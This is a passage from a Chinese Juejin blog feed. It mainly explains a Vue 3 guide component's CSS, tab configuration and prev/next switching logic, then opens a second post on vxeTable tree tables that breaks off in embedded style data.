  <span class="hljs-attribute">width</span>: <span class="hljs-number">44px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">44px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#FFFFFF26</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">37px</span>;
}

<span class="hljs-selector-class">.guide-arrow-icon</span><span class="hljs-selector-pseudo">:first</span>-child {
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.guide-arrow-icon</span><span class="hljs-selector-pseudo">:last-child</span> {
  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d130291aeb84b7d87822b88d4ae72b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=x%2B3Qmr7dV4BLCUKNz6i3fA6ooz4%3D" alt="image-20251204160627685" loading="lazy"/></p>
<blockquote>
<p>内部垂直水平居中</p>
<p>外部左右间距设置为0，紧贴</p>
</blockquote>
<h3 data-id="heading-6">3.2 JS交互</h3>
<p>settings.ts配置</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">GuideMoveTabConfig</span> = [
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'前后'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'move-forward-backward'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">MoveForwardBackwardImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'键盘W/S键 或 按住鼠标滚轮上下滚动'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'左右'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'move-left-right'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">MoveLeftRightImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'键盘A/D键 或 按住鼠标右键左右拖动'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'上下'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'move-up-down'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">MoveUpDownImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'按住鼠标右键上下拖动'</span>,
  },
]

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">GuideRotateTabConfig</span> = [
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'俯仰/航向'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'rotate-pitch'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">RotatePitchImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'按住鼠标左键拖动'</span>,
  },
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'横滚'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'rotate-roll'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">RotateRollImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'键盘Q/E键'</span>,
  },
]

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">GuideScaleTabConfig</span> = [
  {
    <span class="hljs-attr">label</span>: <span class="hljs-string">'聚集环绕'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-string">'scale'</span>,
    <span class="hljs-attr">img</span>: <span class="hljs-title class_">ScaleImg</span>,
    <span class="hljs-attr">info</span>: <span class="hljs-string">'鼠标左键双击，聚集目标点环绕查看'</span>,
  },
]
</code></pre>
<p>Guide.vue 中的 JS 交互</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">GuideMoveTabConfig</span>, <span class="hljs-title class_">GuideRotateTabConfig</span>, <span class="hljs-title class_">GuideScaleTabConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../settings'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ArrowLeftIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/svgs/ArrowLeftIcon.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">GuideArrowRight</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/svgs/GuideArrowRight.vue'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title class_">AllConfig</span> = [...<span class="hljs-title class_">GuideMoveTabConfig</span>, ...<span class="hljs-title class_">GuideRotateTabConfig</span>, ...<span class="hljs-title class_">GuideScaleTabConfig</span>]

<span class="hljs-keyword">const</span> isShow = defineModel&lt;boolean&gt;(<span class="hljs-string">'isShow'</span>, {
  <span class="hljs-attr">type</span>: <span class="hljs-title class_">Boolean</span>,
  <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span>,
})

<span class="hljs-keyword">const</span> activeTab = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'move-forward-backward'</span>)
<span class="hljs-keyword">const</span> currentConfig = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
})
<span class="hljs-keyword">const</span> guideTips = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> currentConfig.<span class="hljs-property">value</span>?.<span class="hljs-property">info</span>
})
<span class="hljs-keyword">const</span> guideImg = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> currentConfig.<span class="hljs-property">value</span>?.<span class="hljs-property">img</span>
})

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleTabClick</span> = (<span class="hljs-params">tab: string</span>) =&gt; {
  activeTab.<span class="hljs-property">value</span> = tab
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePrev</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> currentIndex = <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">if</span> (currentIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> prevIndex = (currentIndex - <span class="hljs-number">1</span> + <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>) % <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>
  <span class="hljs-keyword">const</span> prevConfig = <span class="hljs-title class_">AllConfig</span>[prevIndex]
  <span class="hljs-keyword">if</span> (prevConfig) {
    activeTab.<span class="hljs-property">value</span> = prevConfig.<span class="hljs-property">value</span>
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNext</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> currentIndex = <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">if</span> (currentIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> nextIndex = (currentIndex + <span class="hljs-number">1</span>) % <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>
  <span class="hljs-keyword">const</span> nextConfig = <span class="hljs-title class_">AllConfig</span>[nextIndex]
  <span class="hljs-keyword">if</span> (nextConfig) {
    activeTab.<span class="hljs-property">value</span> = nextConfig.<span class="hljs-property">value</span>
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleConfirm</span> = (<span class="hljs-params"/>) =&gt; {
  isShow.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
}
&lt;/script&gt;
</code></pre>
<p><strong>1.从 settings 里面拿到三个 tab 的配置</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">AllConfig</span> = [...<span class="hljs-title class_">GuideMoveTabConfig</span>, ...<span class="hljs-title class_">GuideRotateTabConfig</span>, ...<span class="hljs-title class_">GuideScaleTabConfig</span>]
</code></pre>
<p><strong>2.解构拼接成一个大数组</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> isShow = defineModel&lt;boolean&gt;(<span class="hljs-string">'isShow'</span>, {
  <span class="hljs-attr">type</span>: <span class="hljs-title class_">Boolean</span>,
  <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span>,
})
</code></pre>
<p>defineModel的用途</p>
<ul>
<li>声明一个“模型字段”（用于 v-model 绑定）</li>
<li>自动生成 props + emits</li>
<li>返回一个 ref（可直接修改，自动触发父组件更新）</li>
</ul>
<blockquote>
<p>boolean（泛型）</p>
<p>defineModel&lt;boolean&gt;,这个 model 的类型是 boolean</p>
<p>isShow.value 必须是 boolean,父组件传进来的数据也必须是 boolean</p>
<pre><code class="hljs language-javascript" lang="javascript">defineModel&lt;boolean&gt;(<span class="hljs-string">'isShow'</span>, ...)
</code></pre>
<p>表示这个 model 的名字叫 isShow</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">type:</span> <span class="hljs-type">Boolean</span>,
<span class="hljs-symbol">default:</span> <span class="hljs-literal">false</span>,
</code></pre>
<p>声明这个 prop 的类型是 Boolean（Vue 的运行时类型检查用）</p>
<p>父组件不传值时，默认值是 false</p>
<p>在子组件里可以直接使用,父组件也会同时更新（双向绑定效果）</p>
<pre><code class="hljs language-javascript" lang="javascript">isShow.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
</code></pre>
</blockquote>
<p><strong>3.默认绑定一个 tab</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> activeTab = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'move-forward-backward'</span>)
</code></pre>
<p><strong>4.维护当前的配置项</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> currentConfig = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
})
</code></pre>
<p>使用计算属性，每次AllConfig 或者activeTab 发生变化的时候触发，保证currentConfig 拿到了当前选中的这项</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> guideTips = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> currentConfig.<span class="hljs-property">value</span>?.<span class="hljs-property">info</span>
})
<span class="hljs-keyword">const</span> guideImg = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> currentConfig.<span class="hljs-property">value</span>?.<span class="hljs-property">img</span>
})
</code></pre>
<blockquote>
<p><code>currentConfig.value?</code>: 因为 <code>currentConfig</code> 是一个计算属性，所以需要用 <code>.value</code> 来访问它的结果。<code>?</code> 是可选链操作符，它防止在 <code>currentConfig.value</code> 为 <code>null</code> 或 <code>undefined</code> 时程序崩溃。</p>
<p><code>...?.info</code>: 它尝试获取当前配置对象中的 <code>info</code> 属性。</p>
<p>作用: <code>guideTips</code> 响应式地保存着当前激活标签对应的提示信息。</p>
<p>图片也同理,看 setting 中的配置就行</p>
</blockquote>
<p><strong>5.更新当前的点击项</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleTabClick</span> = (<span class="hljs-params">tab: string</span>) =&gt; {
  activeTab.<span class="hljs-property">value</span> = tab
}
</code></pre>
<blockquote>
<p>更新当前点击的 tab</p>
</blockquote>
<p><strong>6.切换上一项切换下一项的核心函数</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePrev</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> currentIndex = <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">if</span> (currentIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> prevIndex = (currentIndex - <span class="hljs-number">1</span> + <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>) % <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>
  <span class="hljs-keyword">const</span> prevConfig = <span class="hljs-title class_">AllConfig</span>[prevIndex]
  <span class="hljs-keyword">if</span> (prevConfig) {
    activeTab.<span class="hljs-property">value</span> = prevConfig.<span class="hljs-property">value</span>
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNext</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> currentIndex = <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">if</span> (currentIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> nextIndex = (currentIndex + <span class="hljs-number">1</span>) % <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>
  <span class="hljs-keyword">const</span> nextConfig = <span class="hljs-title class_">AllConfig</span>[nextIndex]
  <span class="hljs-keyword">if</span> (nextConfig) {
    activeTab.<span class="hljs-property">value</span> = nextConfig.<span class="hljs-property">value</span>
  }
}

</code></pre>
<p>核心函数:切换上一项和切换下一项</p>
<p>以切换上一项为例(切换下一项同理):</p>
<ul>
<li>首先拿到当前下标</li>
<li>如果没拿到就返回(防御式编程)</li>
<li>利用当前下标,计算出上一项下标(实现循环)</li>
<li>更新当前的 active.tab</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[关于vxeTable转换树状表格以及问题思考]]></title>    <link>https://juejin.cn/post/7579920818870140970</link>    <guid>https://juejin.cn/post/7579920818870140970</guid>    <pubDate>2025-12-05T03:35:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579920818870140970" data-draft-id="7579846221167968310" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="关于vxeTable转换树状表格以及问题思考"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-05T03:35:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="zReadonly"/> <meta itemprop="url" content="https://juejin.cn/user/3430911593418830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            关于vxeTable转换树状表格以及问题思考
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3430911593418830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    zReadonly
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:35:06.000Z" title="Fri Dec 05 2025 03:35:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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